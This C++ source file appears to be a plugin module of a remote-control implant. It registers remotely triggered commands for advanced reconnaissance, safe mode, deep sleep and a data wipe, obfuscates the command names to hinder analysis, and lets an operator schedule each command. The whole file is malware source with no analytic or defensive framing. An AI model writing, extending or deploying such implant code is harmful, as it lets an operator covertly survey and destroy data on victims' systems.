#include "DynamicDispatcher.h"
#include "Globals.h"
#include "Wipe.h"
#include "Obfuscation.h"
#include <iostream>

void DynamicDispatcher::init() {
    CommandRegistry::instance().register_handler(OBFUSCATE("RECON_ADVANCED"), [](const nlohmann::json& cmd){
        nlohmann::json p = cmd.value("parameters", nlohmann::json::object());
        nlohmann::json exec = {{"command","RECON_ADV"},{"parameters",p}};
        if(cmd.contains("schedule") && g_task_scheduler) g_task_scheduler->schedule(exec, cmd["schedule"]);
        else CommandRegistry::instance().dispatch(exec);
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("SAFE_MODE"), [](const nlohmann::json& cmd){
        if(cmd.contains("schedule") && g_task_scheduler) g_task_scheduler->schedule(cmd, cmd["schedule"]);
        else g_safe_mode.store(true);
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("DEEP_SLEEP"), [](const nlohmann::json& cmd){
        if(cmd.contains("schedule") && g_task_scheduler) g_task_scheduler->schedule(cmd, cmd["schedule"]);
        else g_deep_sleep.store(true);
    });
    CommandRegistry::instance().register_handler(OBFUSCATE("WIPE"), [](const nlohmann::json& cmd){
        if(cmd.contains("schedule") && g_task_scheduler) g_task_scheduler->schedule(cmd, cmd["schedule"]);
        else perform_wipe();
    });
}

extern "C" Module* create_module() { return new DynamicDispatcher(); }
